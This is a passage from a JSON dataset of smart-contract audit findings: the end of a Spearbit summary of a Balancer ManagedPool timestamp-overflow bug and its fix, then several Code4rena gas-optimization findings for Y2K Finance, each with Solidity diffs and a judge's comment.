      "summary": "\nThis bug report is about Balancer's ManagedPool which uses 32 bit values for startTime and endTime, but does not verify if those values exist within that range. This can lead to other fields stored in _miscData to be overwritten. In the version that Aera Vault uses, only the \"restrict LP\" field can be overwritten. However, in the latest version of ManagedPool, many more fields can be overwritten, including the LP flag, Fee end/Fee start, and Swap flag.\n\nThe bug can be exploited by carefully crafting the value of endTime, which allows anyone to use joinPool. It can be caused by the Manager via the updateWeightsGradually() function, or by the Owner via enableTradingWithWeights().\n\nTo solve the issue, a recommendation has been implemented in PR #145. It suggests that before any call is made to pool.updateWeightsGradually() the values of startTime and endTime should be verified to be within the range of type(uint32).max. \n\nThe Spearbit team has acknowledged the recommendation and it has been implemented.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Gauntlet",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [
        "Storage Collision"
      ],
      "finders": [
        "Emanuele Ricci",
        "Eric Wang",
        "Gerard Persoon"
      ]
    },
    {
      "id": "5802",
      "title": "[G-05] State variables should be cached in stack variables rather than re-reading them from storage (9 instances)",
      "impact": "GAS",
      "content": "\n- Deployment. Gas Saved: **28 932**\n\n- Minumal Method Call. Gas Saved: **-59**\n\n- Average Method Call. Gas Saved: **27 525**\n\n- Maximum Method Call. Gas Saved: **27 999**\n\nThe code can be optimized by minimising the number of SLOADs.\n\nSLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.\n\n#### - src/Vault.sol:[188-190](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L188-L190), [228](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L228)\n\n```diff\ndiff --git a/src/Vault.sol b/src/Vault.sol\nindex 1d2e6df..bb4d1f2 100644\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -185,9 +185,9 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  185, 185:         returns (uint256 shares)\n  186, 186:     {\n  187, 187:         require(msg.value > 0, \"ZeroValue\");\n- 188     :-\n- 189     :-        IWETH(address(asset)).deposit{value: msg.value}();\n- 190     :-        assert(IWETH(address(asset)).transfer(msg.sender, msg.value));\n+      188:+        IWETH iweth = IWETH(address(asset));\n+      189:+        iweth.deposit{value: msg.value}();\n+      190:+        assert(iweth.transfer(msg.sender, msg.value));\n  191, 191:\n  192, 192:         return deposit(id, msg.value, receiver);\n  193, 193:     }\n@@ -225,10 +225,12 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  225, 225:         //Taking fee from the amount\n  226, 226:         uint256 feeValue = calculateWithdrawalFeeValue(entitledShares, id);\n  227, 227:         entitledShares = entitledShares - feeValue;\n- 228     :-        asset.transfer(treasury, feeValue);\n+      228:+\n+      229:+        ERC20 _asset = asset;\n+      230:+        _asset.transfer(treasury, feeValue);\n  229, 231:\n  230, 232:         emit Withdraw(msg.sender, receiver, owner, id, assets, entitledShares);\n- 231     :-        asset.transfer(receiver, entitledShares);\n+      233:+        _asset.transfer(receiver, entitledShares);\n  232, 234:\n  233, 235:         return entitledShares;\n  234, 236:     }\n```\n\n#### - src/VaultFactory.sol:[188](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/VaultFactory.sol#L188), [195](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/VaultFactory.sol#L195), [203](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/VaultFactory.sol#L203)\n\n```diff\ndiff --git a/src/VaultFactory.sol b/src/VaultFactory.sol\nindex bfd70f1..f5a7616 100644\n--- a/src/VaultFactory.sol\n+++ b/src/VaultFactory.sol\n@@ -184,46 +184,54 @@ contract VaultFactory {\n  184, 184:         address _oracle,\n  185, 185:         string memory _name\n  186, 186:     ) public onlyAdmin returns (address insr, address rsk) {\n+      187:+        Vault hedge;\n+      188:+        Vault risk;\n+      189:+        uint256 _marketIndex;\n+      190:+        {\n+      191:+        address _controller = controller;\n  187, 192:         if(\n- 188     :-            IController(controller).getVaultFactory() != address(this)\n+      193:+            IController(_controller).getVaultFactory() != address(this)\n  189, 194:             )\n  190, 195:             revert AddressFactoryNotInController();\n  191, 196:\n- 192     :-        if(controller == address(0))\n+      197:+        if(_controller == address(0))\n  193, 198:             revert ControllerNotSet();\n  194, 199:\n- 195     :-        marketIndex += 1;\n+      200:+        _marketIndex = (marketIndex += 1);\n  196, 201:\n  197, 202:         //y2kUSDC_99*RISK or y2kUSDC_99*HEDGE\n  198, 203:\n- 199     :-        Vault hedge = new Vault(\n+      204:+        address _treasury = treasury;\n+      205:+\n+      206:+        hedge = new Vault(\n  200, 207:             WETH,\n  201, 208:             string(abi.encodePacked(_name,\"HEDGE\")),\n  202, 209:             \"hY2K\",\n- 203     :-            treasury,\n+      210:+            _treasury,\n  204, 211:             _token,\n  205, 212:             _strikePrice,\n- 206     :-            controller\n+      213:+            _controller\n  207, 214:         );\n  208, 215:\n- 209     :-        Vault risk = new Vault(\n+      216:+        risk = new Vault(\n  210, 217:             WETH,\n  211, 218:             string(abi.encodePacked(_name,\"RISK\")),\n  212, 219:             \"rY2K\",\n- 213     :-            treasury,\n+      220:+            _treasury,\n  214, 221:             _token,\n  215, 222:             _strikePrice,\n- 216     :-            controller\n+      223:+            _controller\n  217, 224:         );\n+      225:+    }\n  218, 226:\n- 219     :-        indexVaults[marketIndex] = [address(hedge), address(risk)];\n+      227:+        indexVaults[_marketIndex] = [address(hedge), address(risk)];\n  220, 228:\n  221, 229:         if (tokenToOracle[_token] == address(0)) {\n  222, 230:             tokenToOracle[_token] = _oracle;\n  223, 231:         }\n  224, 232:\n  225, 233:         emit MarketCreated(\n- 226     :-            marketIndex,\n+      234:+            _marketIndex,\n  227, 235:             address(hedge),\n  228, 236:             address(risk),\n  229, 237:             _token,\n@@ -231,7 +239,7 @@ contract VaultFactory {\n  231, 239:             _strikePrice\n  232, 240:         );\n  233, 241:\n- 234     :-        MarketVault memory marketVault = MarketVault(marketIndex, epochBegin, epochEnd, hedge, risk, _withdrawalFee);\n+      242:+        MarketVault memory marketVault = MarketVault(_marketIndex, epochBegin, epochEnd, hedge, risk, _withdrawalFee);\n  235, 243:\n  236, 244:         _createEpoch(marketVault);\n  237, 245:\n```\n\n#### - src/oracles/PegOracle.sol:[29](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L29), [36](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/oracles/PegOracle.sol#L36)\n\n```diff\ndiff --git a/src/oracles/PegOracle.sol b/src/oracles/PegOracle.sol\nindex 1c65268..108b041 100644\n--- a/src/oracles/PegOracle.sol\n+++ b/src/oracles/PegOracle.sol\n@@ -26,14 +26,14 @@ contract PegOracle {\n   26,  26:         priceFeed1 = AggregatorV3Interface(_oracle1);\n   27,  27:         priceFeed2 = AggregatorV3Interface(_oracle2);\n   28,  28:         require(\n-  29     :-            (priceFeed1.decimals() == priceFeed2.decimals()),\n+       29:+            (AggregatorV3Interface(_oracle1).decimals() == AggregatorV3Interface(_oracle2).decimals()),\n   30,  30:             \"Decimals must be the same\"\n   31,  31:         );\n   32,  32:\n   33,  33:         oracle1 = _oracle1;\n   34,  34:         oracle2 = _oracle2;\n   35,  35:\n-  36     :-        decimals = priceFeed1.decimals();\n+       36:+        decimals = AggregatorV3Interface(_oracle1).decimals();\n   37,  37:     }\n   38,  38:\n   39,  39:     /** @notice Returns oracle-fed data from the latest round\n```\n\n#### - src/rewards/StakingRewards.sol:[160](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L160), [189-190](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/StakingRewards.sol#L189-L190)\n\n```diff\ndiff --git a/src/rewards/StakingRewards.sol b/src/rewards/StakingRewards.sol\nindex 5edb4e8..345821c 100644\n--- a/src/rewards/StakingRewards.sol\n+++ b/src/rewards/StakingRewards.sol\n@@ -157,7 +157,8 @@ contract StakingRewards is\n  157, 157:     }\n  158, 158:\n  159, 159:     function rewardPerToken() public view returns (uint256) {\n- 160     :-        if (_totalSupply == 0) {\n+      160:+        uint256 totakSupply_;\n+      161:+        if ((totakSupply_ = _totalSupply) == 0) {\n  161, 162:             return rewardPerTokenStored;\n  162, 163:         }\n  163, 164:         return\n@@ -166,7 +167,7 @@ contract StakingRewards is\n  166, 167:                     .sub(lastUpdateTime)\n  167, 168:                     .mul(rewardRate)\n  168, 169:                     .mul(1e18)\n- 169     :-                    .div(_totalSupply)\n+      170:+                    .div(totakSupply_)\n  170, 171:             );\n  171, 172:     }\n  172, 173:\n@@ -186,12 +187,14 @@ contract StakingRewards is\n  186, 187:         onlyRewardsDistribution\n  187, 188:         updateReward(address(0))\n  188, 189:     {\n- 189     :-        if (block.timestamp >= periodFinish) {\n- 190     :-            rewardRate = reward.div(rewardsDuration);\n+      190:+        uint256 periodFinish_;\n+      191:+        uint256 rewardsDuration_ = rewardsDuration;\n+      192:+        if (block.timestamp >= (periodFinish_ = periodFinish)) {\n+      193:+            rewardRate = reward.div(rewardsDuration_);\n  191, 194:         } else {\n- 192     :-            uint256 remaining = periodFinish.sub(block.timestamp);\n+      195:+            uint256 remaining = periodFinish_.sub(block.timestamp);\n  193, 196:             uint256 leftover = remaining.mul(rewardRate);\n- 194     :-            rewardRate = reward.add(leftover).div(rewardsDuration);\n+      197:+            rewardRate = reward.add(leftover).div(rewardsDuration_);\n  195, 198:         }\n  196, 199:\n  197, 200:         // Ensure the provided reward amount is not more than the balance in the contract.\n@@ -200,12 +203,12 @@ contract StakingRewards is\n  200, 203:         // Reward + leftover must be less than 2^256 / 10^18 to avoid overflow.\n  201, 204:         uint256 balance = rewardsToken.balanceOf(address(this));\n  202, 205:         require(\n- 203     :-            rewardRate <= balance.div(rewardsDuration),\n+      206:+            rewardRate <= balance.div(rewardsDuration_),\n  204, 207:             \"Provided reward too high\"\n  205, 208:         );\n  206, 209:\n  207, 210:         lastUpdateTime = block.timestamp;\n- 208     :-        periodFinish = block.timestamp.add(rewardsDuration);\n+      211:+        periodFinish = block.timestamp.add(rewardsDuration_);\n  209, 212:         emit RewardAdded(reward);\n  210, 213:     }\n  211, 214:\n```\n\n**[HickupHH3 (judge) commented](https://github.com/code-423n4/2022-09-y2k-finance-findings/issues/327#issuecomment-1307471274):**\n>I selected this report as the best for a few reasons:\n>1) Total gas saved is the highest (another report that came close was eierina's)\n>2) Properly benchmarked its gas optimizations against the original implementation\n>3) Great formatting on changes to be made to the contracts\n>\n\n>I downplay the custom error gas optimisation suggestion even though it might save ~8.5k gas on average as per [this twitter thread]( https://twitter.com/PaulRBerg/status/1586371425937539073), the gas savings are only materialised upon an actual revert. There are minimally deployment costs savings of couse. However, the translation of `require` to custom errors is non-trivial because it requires inversion of the conditional check. \n>\n>I'd like to mention other notable (and unique) gas optimisations for the report from other wardens:\n>- eierina: Prefer fixed size arrays in place of dynamic sized arrays where fits (~22k gas)\n>- rokinot: Solmate's reentrancy guard is cheaper than OZ's. (Minimally 3k gas)\n>- Multiple wardens: Drop the use of SafeMath for StakingRewards. Requires updating of the `StakingRewards` contract which I understand the sponsor does not wish to modify.\n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "#g-05-state-variables-should-be-cached-in-stack-variables-rather-than-re-reading-them-from-storage-9-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5801",
      "title": "[G-04] Using bools for storage incurs overhead (1 instance)",
      "impact": "GAS",
      "content": "\n- Deployment. Gas Saved: **31 843**\n\n- Minumal Method Call. Gas Saved: **144**\n\n- Average Method Call. Gas Saved: **11 635**\n\n- Maximum Method Call. Gas Saved: **17 611**\n\n```\n// Booleans are more expensive than uint256 or any type that takes up a full\n// word because each write operation emits an extra SLOAD to first read the\n// slot's contents, replace the bits taken up by the boolean, and then write\n// back. This is the compiler's defense against contract upgrades and\n// pointer aliasing, and it cannot be disabled.\n```\n\nUse uint256(1) and uint256(2) for true/false to avoid a Gwarmaccess (100 gas) for the extra SLOAD, and to avoid Gsset (20000 gas) when changing from 'false' to 'true', after having been 'true' in the past\n\n#### - src/Vault.sol:[54](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L54)\n\n```diff\ndiff --git a/src/Controller.sol b/src/Controller.sol\nindex e15b0fa..64c68f3 100644\n--- a/src/Controller.sol\n+++ b/src/Controller.sol\n@@ -90,7 +90,7 @@ contract Controller {\n   90,  90:         address vaultAddress = vaultsAddress[0];\n   91,  91:         Vault vault = Vault(vaultAddress);\n   92,  92:\n-  93     :-        if(vault.idExists(epochEnd) == false)\n+       93:+        if(vault.idExists(epochEnd) == 0)\n   94,  94:             revert EpochNotExist();\n   95,  95:\n   96,  96:         if(\n@@ -208,7 +208,7 @@ contract Controller {\n  208, 208:         Vault insrVault = Vault(vaultsAddress[0]);\n  209, 209:         Vault riskVault = Vault(vaultsAddress[1]);\n  210, 210:\n- 211     :-        if(insrVault.idExists(epochEnd) == false || riskVault.idExists(epochEnd) == false)\n+      211:+        if(insrVault.idExists(epochEnd) == 0 || riskVault.idExists(epochEnd) == 0)\n  212, 212:             revert EpochNotExist();\n  213, 213:\n  214, 214:         //require this function cannot be called twice in the same epoch for the same vault\ndiff --git a/src/Vault.sol b/src/Vault.sol\nindex 1d2e6df..12af155 100644\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -51,7 +51,7 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n   51,  51:     // @audit id can be uint32\n   52,  52:     mapping(uint256 => bool) public idDepegged;\n   53,  53:     // @audit id can be uint32\n-  54     :-    mapping(uint256 => bool) public idExists;\n+       54:+    mapping(uint256 => uint256) public idExists;\n   55,  55:     mapping(uint256 => uint256) public epochFee;\n   56,  56:\n   57,  57:     /*//////////////////////////////////////////////////////////////\n@@ -77,7 +77,7 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n   77,  77:     /** @notice Only market addresses can call functions that use this modifier\n   78,  78:       */\n   79,  79:     modifier marketExists(uint256 id) {\n-  80     :-        if(idExists[id] != true)\n+       80:+        if(idExists[id] != 1)\n   81,  81:             revert MarketEpochDoesNotExist();\n   82,  82:         _;\n   83,  83:     }\n@@ -311,13 +311,13 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  311, 311:         if(_withdrawalFee > 150)\n  312, 312:             revert FeeMoreThan150(_withdrawalFee);\n  313, 313:\n- 314     :-        if(idExists[epochEnd] == true)\n+      314:+        if(idExists[epochEnd] == 1)\n  315, 315:             revert MarketEpochExists();\n  316, 316:\n  317, 317:         if(epochBegin >= epochEnd)\n  318, 318:             revert EpochEndMustBeAfterBegin();\n  319, 319:\n- 320     :-        idExists[epochEnd] = true;\n+      320:+        idExists[epochEnd] = 1;\n  321, 321:         idEpochBegin[epochEnd] = epochBegin;\n  322, 322:         epochs.push(epochEnd);\n  323, 323:\ndiff --git a/src/rewards/RewardsFactory.sol b/src/rewards/RewardsFactory.sol\nindex 8bee8bd..d463005 100644\n--- a/src/rewards/RewardsFactory.sol\n+++ b/src/rewards/RewardsFactory.sol\n@@ -93,7 +93,7 @@ contract RewardsFactory {\n   93,  93:         if(_insrToken == address(0) || _riskToken == address(0))\n   94,  94:             revert MarketDoesNotExist(_marketIndex);\n   95,  95:\n-  96     :-        if(Vault(_insrToken).idExists(_epochEnd) == false || Vault(_riskToken).idExists(_epochEnd) == false)\n+       96:+        if(Vault(_insrToken).idExists(_epochEnd) == 0 || Vault(_riskToken).idExists(_epochEnd) == 0)\n   97,  97:             revert EpochDoesNotExist();\n   98,  98:\n   99,  99:         StakingRewards insrStake = new StakingRewards(\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "#g-04-using-bools-for-storage-incurs-overhead-1-instance",
      "tags": [],
      "finders": []
    },
    {
      "id": "5800",
      "title": "[G-03] Modifiers are redundant if used only once or not used at all. (5 instances)",
      "impact": "GAS",
      "content": "\n- Deployment. Gas Saved: **33 649**\n\n- Minumal Method Call. Gas Saved: **-202**\n\n- Average Method Call. Gas Saved: **2 700**\n\n- Maximum Method Call. Gas Saved: **4 931**\n\n#### - src/Controller.sol:[67-111](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L67-L111)\n\n```diff\ndiff --git a/src/Controller.sol b/src/Controller.sol\nindex e15b0fa..b8cafb5 100644\n--- a/src/Controller.sol\n+++ b/src/Controller.sol\n@@ -64,51 +64,6 @@ contract Controller {\n   64,  64:     }\n   65,  65:     /* solhint-enable  var-name-mixedcase */\n   66,  66:\n-  67     :-    /*//////////////////////////////////////////////////////////////\n-  68     :-                                 MODIFIERS\n-  69     :-    //////////////////////////////////////////////////////////////*/\n-  70     :-\n-  71     :-    /** @notice Only admin addresses can call functions that use this modifier\n-  72     :-      */\n-  73     :-    modifier onlyAdmin() {\n-  74     :-        if(msg.sender != admin)\n-  75     :-            revert AddressNotAdmin();\n-  76     :-        _;\n-  77     :-    }\n-  78     :-\n-  79     :-    /** @notice Modifier to ensure market exists, current market epoch time and price are valid\n-  80     :-      * @param marketIndex Target market index\n-  81     :-      * @param epochEnd End of epoch set for market\n-  82     :-      */\n-  83     :-    modifier isDisaster(uint256 marketIndex, uint256 epochEnd) {\n-  84     :-        address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n-  85     :-        if(\n-  86     :-            vaultsAddress.length != VAULTS_LENGTH\n-  87     :-            )\n-  88     :-            revert MarketDoesNotExist(marketIndex);\n-  89     :-\n-  90     :-        address vaultAddress = vaultsAddress[0];\n-  91     :-        Vault vault = Vault(vaultAddress);\n-  92     :-\n-  93     :-        if(vault.idExists(epochEnd) == false)\n-  94     :-            revert EpochNotExist();\n-  95     :-\n-  96     :-        if(\n-  97     :-            vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n-  98     :-            )\n-  99     :-            revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n- 100     :-\n- 101     :-        if(\n- 102     :-            vault.idEpochBegin(epochEnd) > block.timestamp)\n- 103     :-            revert EpochNotStarted();\n- 104     :-\n- 105     :-        if(\n- 106     :-            block.timestamp > epochEnd\n- 107     :-            )\n- 108     :-            revert EpochExpired();\n- 109     :-        _;\n- 110     :-    }\n- 111     :-\n  112,  67:     /*//////////////////////////////////////////////////////////////\n  113,  68:                                 CONSTRUCTOR\n  114,  69:     //////////////////////////////////////////////////////////////*/\n@@ -147,9 +102,32 @@ contract Controller {\n  147, 102:       */\n  148, 103:     function triggerDepeg(uint256 marketIndex, uint256 epochEnd)\n  149, 104:         public\n- 150     :-        isDisaster(marketIndex, epochEnd)\n  151, 105:     {\n  152, 106:         address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n+      107:+        if(\n+      108:+            vaultsAddress.length != VAULTS_LENGTH\n+      109:+            )\n+      110:+            revert MarketDoesNotExist(marketIndex);\n+      111:+\n+      112:+        address vaultAddress = vaultsAddress[0];\n+      113:+        Vault vault = Vault(vaultAddress);\n+      114:+\n+      115:+        if(vault.idExists(epochEnd) == false)\n+      116:+            revert EpochNotExist();\n+      117:+\n+      118:+        if(\n+      119:+            vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n+      120:+            )\n+      121:+            revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n+      122:+\n+      123:+        if(\n+      124:+            vault.idEpochBegin(epochEnd) > block.timestamp)\n+      125:+            revert EpochNotStarted();\n+      126:+\n+      127:+        if(\n+      128:+            block.timestamp > epochEnd\n+      129:+            )\n+      130:+            revert EpochExpired();\n  153, 131:         Vault insrVault = Vault(vaultsAddress[0]);\n  154, 132:         Vault riskVault = Vault(vaultsAddress[1]);\n  155, 133:\n```\n\n#### - src/Vault.sol:[85-100](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Vault.sol#L85-L100)\n\n```diff\ndiff --git a/src/Vault.sol b/src/Vault.sol\nindex 1d2e6df..9e480ed 100644\n--- a/src/Vault.sol\n+++ b/src/Vault.sol\n@@ -82,22 +82,6 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n   82,  82:         _;\n   83,  83:     }\n   84,  84:\n-  85     :-    /** @notice You can only call functions that use this modifier before the current epoch has started\n-  86     :-      */\n-  87     :-    modifier epochHasNotStarted(uint256 id) {\n-  88     :-        if(block.timestamp > idEpochBegin[id] - timewindow)\n-  89     :-            revert EpochAlreadyStarted();\n-  90     :-        _;\n-  91     :-    }\n-  92     :-\n-  93     :-    /** @notice You can only call functions that use this modifier after the current epoch has started\n-  94     :-      */\n-  95     :-    modifier epochHasEnded(uint256 id) {\n-  96     :-        if((block.timestamp < id) && idDepegged[id] == false)\n-  97     :-            revert EpochNotFinished();\n-  98     :-        _;\n-  99     :-    }\n- 100     :-\n  101,  85:     /*//////////////////////////////////////////////////////////////\n  102,  86:                                  CONSTRUCTOR\n  103,  87:     //////////////////////////////////////////////////////////////*/\n@@ -157,10 +141,11 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  157, 141:         public\n  158, 142:         override\n  159, 143:         marketExists(id)\n- 160     :-        epochHasNotStarted(id)\n  161, 144:         nonReentrant\n  162, 145:         returns (uint256 shares)\n  163, 146:     {\n+      147:+        if(block.timestamp > idEpochBegin[id] - timewindow)\n+      148:+            revert EpochAlreadyStarted();\n  164, 149:         // Check for rounding error since we round down in previewDeposit.\n  165, 150:         require((shares = previewDeposit(id, assets)) != 0, \"ZeroValue\");\n  166, 151:\n@@ -208,10 +193,11 @@ contract Vault is SemiFungibleVault, ReentrancyGuard {\n  208, 193:     )\n  209, 194:         external\n  210, 195:         override\n- 211     :-        epochHasEnded(id)\n  212, 196:         marketExists(id)\n  213, 197:         returns (uint256 shares)\n  214, 198:     {\n+      199:+        if((block.timestamp < id) && idDepegged[id] == false)\n+      200:+            revert EpochNotFinished();\n  215, 201:         if(\n  216, 202:             msg.sender != owner &&\n  217, 203:             isApprovedForAll(owner, receiver) == false)\n```\n\n#### - src/rewards/RewardsFactory.sol:[50-56](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/rewards/RewardsFactory.sol#L50-L56)\n\n```diff\ndiff --git a/src/rewards/RewardsFactory.sol b/src/rewards/RewardsFactory.sol\nindex 8bee8bd..35c45b4 100644\n--- a/src/rewards/RewardsFactory.sol\n+++ b/src/rewards/RewardsFactory.sol\n@@ -47,13 +47,6 @@ contract RewardsFactory {\n   47,  47:                                   MODIFIERS\n   48,  48:     //////////////////////////////////////////////////////////////*/\n   49,  49:\n-  50     :-    /** @notice Only admin addresses can call functions with this modifier\n-  51     :-      */\n-  52     :-    modifier onlyAdmin() {\n-  53     :-        if(msg.sender != admin)\n-  54     :-            revert AddressNotAdmin();\n-  55     :-        _;\n-  56     :-    }\n   57,  50:\n   58,  51:     /** @notice Contract constructor\n   59,  52:       * @param _govToken Governance token address\n@@ -82,9 +75,10 @@ contract RewardsFactory {\n   82,  75:       */\n   83,  76:     function createStakingRewards(uint256 _marketIndex, uint256 _epochEnd, uint256 _rewardDuration, uint256 _rewardRate)\n   84,  77:         external\n-  85     :-        onlyAdmin\n   86,  78:         returns (address insr, address risk)\n   87,  79:     {\n+       80:+        if(msg.sender != admin)\n+       81:+            revert AddressNotAdmin();\n   88,  82:         VaultFactory vaultFactory = VaultFactory(factory);\n   89,  83:\n   90,  84:         address _insrToken = vaultFactory.getVaults(_marketIndex)[0];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Y2k Finance",
      "source_link": "https://code4rena.com/reports/2022-09-y2k-finance",
      "github_link": "#g-03-modifiers-are-redundant-if-used-only-once-or-not-used-at-all-5-instances",
      "tags": [],
      "finders": []
    },
    {
      "id": "5799",
      "title": "[G-02] Cache the results of an external function instead of calling it again (5 instances)",
      "impact": "GAS",
      "content": "\n- Deployment. Gas Saved: **102 794**\n\n- Minumal Method Call. Gas Saved: **-53**\n\n- Average Method Call. Gas Saved: **7 512**\n\n- Maximum Method Call. Gas Saved: **7 514**\n\n#### - src/Controller.sol:[199-200](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L199-L200), [202-203](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L202-L203), [206-209](https://github.com/code-423n4/2022-09-y2k-finance/blob/2175c044af98509261e4147edeb48e1036773771/src/Controller.sol#L206-L209)\n\n```diff\ndiff --git a/src/Controller.sol b/src/Controller.sol\nindex e15b0fa..54503d7 100644\n--- a/src/Controller.sol\n+++ b/src/Controller.sol\n@@ -76,39 +76,6 @@ contract Controller {\n   76,  76:         _;\n   77,  77:     }\n   78,  78:\n-  79     :-    /** @notice Modifier to ensure market exists, current market epoch time and price are valid\n-  80     :-      * @param marketIndex Target market index\n-  81     :-      * @param epochEnd End of epoch set for market\n-  82     :-      */\n-  83     :-    modifier isDisaster(uint256 marketIndex, uint256 epochEnd) {\n-  84     :-        address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n-  85     :-        if(\n-  86     :-            vaultsAddress.length != VAULTS_LENGTH\n-  87     :-            )\n-  88     :-            revert MarketDoesNotExist(marketIndex);\n-  89     :-\n-  90     :-        address vaultAddress = vaultsAddress[0];\n-  91     :-        Vault vault = Vault(vaultAddress);\n-  92     :-\n-  93     :-        if(vault.idExists(epochEnd) == false)\n-  94     :-            revert EpochNotExist();\n-  95     :-\n-  96     :-        if(\n-  97     :-            vault.strikePrice() < getLatestPrice(vault.tokenInsured())\n-  98     :-            )\n-  99     :-            revert PriceNotAtStrikePrice(getLatestPrice(vault.tokenInsured()));\n- 100     :-\n- 101     :-        if(\n- 102     :-            vault.idEpochBegin(epochEnd) > block.timestamp)\n- 103     :-            revert EpochNotStarted();\n- 104     :-\n- 105     :-        if(\n- 106     :-            block.timestamp > epochEnd\n- 107     :-            )\n- 108     :-            revert EpochExpired();\n- 109     :-        _;\n- 110     :-    }\n- 111     :-\n  112,  79:     /*//////////////////////////////////////////////////////////////\n  113,  80:                                 CONSTRUCTOR\n  114,  81:     //////////////////////////////////////////////////////////////*/\n@@ -147,12 +114,27 @@ contract Controller {\n  147, 114:       */\n  148, 115:     function triggerDepeg(uint256 marketIndex, uint256 epochEnd)\n  149, 116:         public\n- 150     :-        isDisaster(marketIndex, epochEnd)\n  151, 117:     {\n  152, 118:         address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n+      119:+        if(vaultsAddress.length != VAULTS_LENGTH)\n+      120:+            revert MarketDoesNotExist(marketIndex);\n+      121:+\n  153, 122:         Vault insrVault = Vault(vaultsAddress[0]);\n  154, 123:         Vault riskVault = Vault(vaultsAddress[1]);\n  155, 124:\n+      125:+        if(insrVault.idExists(epochEnd) == false)\n+      126:+            revert EpochNotExist();\n+      127:+\n+      128:+        int256 nowPrice;\n+      129:+        if(insrVault.strikePrice() < (nowPrice = getLatestPrice(insrVault.tokenInsured())))\n+      130:+            revert PriceNotAtStrikePrice(nowPrice);\n+      131:+\n+      132:+        if(insrVault.idEpochBegin(epochEnd) > block.timestamp)\n+      133:+            revert EpochNotStarted();\n+      134:+\n+      135:+        if(block.timestamp > epochEnd)\n+      136:+            revert EpochExpired();\n+      137:+\n  156, 138:         //require this function cannot be called twice in the same epoch for the same vault\n  157, 139:         if(insrVault.idFinalTVL(epochEnd) != 0)\n  158, 140:             revert NotZeroTVL();\n@@ -196,17 +178,14 @@ contract Controller {\n  196, 178:       * @param epochEnd End of epoch set for market\n  197, 179:       */\n  198, 180:     function triggerEndEpoch(uint256 marketIndex, uint256 epochEnd) public {\n- 199     :-        if(\n- 200     :-            vaultFactory.getVaults(marketIndex).length != VAULTS_LENGTH)\n+      181:+        address[] memory vaults = vaultFactory.getVaults(marketIndex);\n+      182:+        if(vaults.length != VAULTS_LENGTH)\n  201, 183:                 revert MarketDoesNotExist(marketIndex);\n- 202     :-        if(\n- 203     :-            block.timestamp < epochEnd)\n+      184:+        if(block.timestamp < epochEnd)\n  204, 185:             revert EpochNotExpired();\n  205, 186:\n- 206     :-        address[] memory vaultsAddress = vaultFactory.getVaults(marketIndex);\n- 207     :-\n- 208     :-        Vault insrVault = Vault(vaultsAddress[0]);\n- 209     :-        Vault riskVault = Vault(vaultsAddress[1]);\n+      187:+        Vault insrVault = Vault(vaults[0]);\n+      188:+        Vault riskVault = Vault(vaults[1]);\n  210, 189:\n  211, 190:         if(insrVault.idExists(epochEnd) == false || riskVault.idExists(epochEnd) == false)\n  212, 191:             revert EpochNotExist();\n```\n\n#### - 